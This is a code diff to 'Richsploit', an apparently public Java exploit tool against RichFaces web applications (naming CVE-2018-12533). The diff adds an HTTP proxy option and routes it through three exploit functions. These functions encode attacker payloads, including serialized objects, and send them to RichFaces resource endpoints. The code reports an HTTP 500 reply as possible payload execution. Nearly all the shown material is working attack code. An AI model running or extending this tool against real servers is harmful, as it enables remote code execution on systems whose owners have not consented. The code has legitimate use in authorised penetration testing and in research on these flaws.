@@ -4,7 +4,12 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
+import java.lang.ArrayIndexOutOfBoundsException;
 import java.net.URL;
+import java.net.Proxy;
+import java.net.InetSocketAddress;
+import java.net.HttpURLConnection;
+import java.net.ConnectException;
 
 import org.ajax4jsf.resource.UserResource.UriData;
 import org.apache.commons.cli.CommandLine;
@@ -53,6 +58,9 @@ public class Richsploit {
         payload.setRequired(true);
         options.addOption(payload);
 
+        Option proxy = new Option("x", "proxy", true, "Use HTTP proxy (Format: HOST:PORT)");
+        options.addOption(proxy);
+
         CommandLineParser parser = new DefaultParser();
         HelpFormatter formatter = new HelpFormatter();
         CommandLine cmd = null;
@@ -70,26 +78,41 @@ public class Richsploit {
         String inputVersion = cmd.getOptionValue("version");
         String inputExploit = cmd.getOptionValue("exploit");
         String inputPayload = cmd.getOptionValue("payload");
+        String inputProxy = cmd.getOptionValue("proxy");
         
+        boolean proxyEnabled = cmd.hasOption("x");
+
         if(!(inputVersion.equals("3") || inputVersion.contentEquals("4"))) {
-        	printNegative("Version should be 3 or 4");
-        	System.exit(1);
+            printNegative("Version should be 3 or 4");
+            System.exit(1);
         }
         
         int exploit_nr = Integer.parseInt(inputExploit);
         if(exploit_nr < 0 || exploit_nr > 4) {
-        	printNegative("Exploit should be 0, 1, 2, 3 or 4");
+            printNegative("Exploit should be 0, 1, 2, 3 or 4");
         }
         
         switch(exploit_nr) {
         case 0:
-        	exploit0(inputUrl, inputVersion, inputPayload);
-        	break;
+            if (proxyEnabled) {
+                exploit0(inputUrl, inputVersion, inputPayload, inputProxy);
+            } else {
+                exploit0(inputUrl, inputVersion, inputPayload, "");
+            }
+            break;
         case 1:
-        	exploit1(inputUrl, inputVersion, inputPayload);
-        	break;
+            if (proxyEnabled) {
+                exploit1(inputUrl, inputVersion, inputPayload, inputProxy);
+            } else {
+                exploit1(inputUrl, inputVersion, inputPayload, "");
+            }
+            break;
         case 2:
-        	exploit2(inputUrl, inputVersion, inputPayload);
+            if (proxyEnabled) {
+                exploit2(inputUrl, inputVersion, inputPayload, inputProxy);
+            } else {
+                exploit2(inputUrl, inputVersion, inputPayload, "");
+            }
         	break;
         case 3:
         	printNegative("CVE-2018-12533 is currently not supported");
@@ -153,7 +176,7 @@ public class Richsploit {
 	}
 
 	@SuppressWarnings("deprecation")
-	private static void exploit2(String inputUrl, String inputVersion, String inputPayload) {
+	private static void exploit2(String inputUrl, String inputVersion, String inputPayload, String inputProxy) {
 		if(!inputVersion.equals("4")) {
 			printNegative("This exploit only works for Richfaces 4.x");
 			System.exit(1);
@@ -181,11 +204,11 @@ public class Richsploit {
         dat[4] = null;
        
 		String encoded_payload = ResourceUtils.encodeObjectData(dat);
-		send_mor(inputUrl, encoded_payload);
+		send_mor(inputUrl, encoded_payload, inputProxy);
 	}
 
 	@SuppressWarnings("deprecation")
-	private static void exploit1(String inputUrl, String inputVersion, String inputPayload) {
+	private static void exploit1(String inputUrl, String inputVersion, String inputPayload, String inputProxy) {
 		if(!inputVersion.equals("4")) {
 			printNegative("This exploit only works for Richfaces 4.x");
 			System.exit(1);
@@ -211,10 +234,10 @@ public class Richsploit {
 		dat[4] = null;
 
 		String encoded_payload = ResourceUtils.encodeObjectData(dat);
-		send_mor(inputUrl, encoded_payload);
+		send_mor(inputUrl, encoded_payload, inputProxy);
 	}
 
-	private static void exploit0(String inputUrl, String inputVersion, String inputPayload) {
+	private static void exploit0(String inputUrl, String inputVersion, String inputPayload, String inputProxy) {
 		printInfo("Encoding payload");
 		String encoded_payload = RichfacesDecoder.encode(inputPayload);
 		
@@ -224,10 +247,10 @@ public class Richsploit {
 			url.append(inputUrl + "org.richfaces.renderkit.html.images.BevelSeparatorImage/DATA/");
 			printInfo("Sending request to " + url.toString() + "...");
 			url.append(encoded_payload + ".jsf");
-			send_request(url.toString());
+			send_request(url.toString(), inputProxy);
 			break;
 		case "4":
-			send_mor(inputUrl, encoded_payload);
+			send_mor(inputUrl, encoded_payload, inputProxy);
 			break;
 		}
 	}
@@ -251,7 +274,7 @@ public class Richsploit {
 	}
 	
 
-	private static void send_mor(String inputUrl, String encoded_payload) {
+	private static void send_mor(String inputUrl, String encoded_payload, String inputProxy) {
 		StringBuilder url = new StringBuilder();
 		
 		// Remove trailing slash
@@ -263,16 +286,36 @@ public class Richsploit {
 		printInfo("Sending request to " + url.toString() + "...");
 		url.append("?do=" + encoded_payload);
 		
-		send_request(url.toString());
+		send_request(url.toString(), inputProxy);
 	}
-	
-	private static void send_request(String url) {
+
+	private static void send_request(String url, String inputProxy) {
 		if(DEBUG) {
 			System.out.println(url);
 		}
 		try {
-			URL url_connection = new URL(url);
-			url_connection.openStream();
+			if (inputProxy.isEmpty()) {
+				URL url_connection = new URL(url);
+				url_connection.openStream();
+			} else {
+
+				try {
+					String[] proxy_settings = inputProxy.split(":");
+					String proxy_addr = proxy_settings[0];
+					Integer proxy_port = Integer.valueOf(proxy_settings[1]);
+
+					Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxy_addr, proxy_port));
+					URL target_url = new URL(url);
+					HttpURLConnection connection = (HttpURLConnection) target_url.openConnection(proxy);
+					connection.getInputStream();
+				} catch (ArrayIndexOutOfBoundsException e) {
+					printInfo("Failed to parse proxy address. Proxy should be given in HOST:PORT format.");
+					System.exit(1);
+				} catch (ConnectException e) {
+					printInfo("Failed to connect to proxy. Ensure proxy is listening.");
+					System.exit(1);
+				}
+			}
 		} catch (IOException e) {
 			if(e.getMessage().contains("Server returned HTTP response code: 500")) {
 				printInfo("Server returned 500, payload might have been executed");
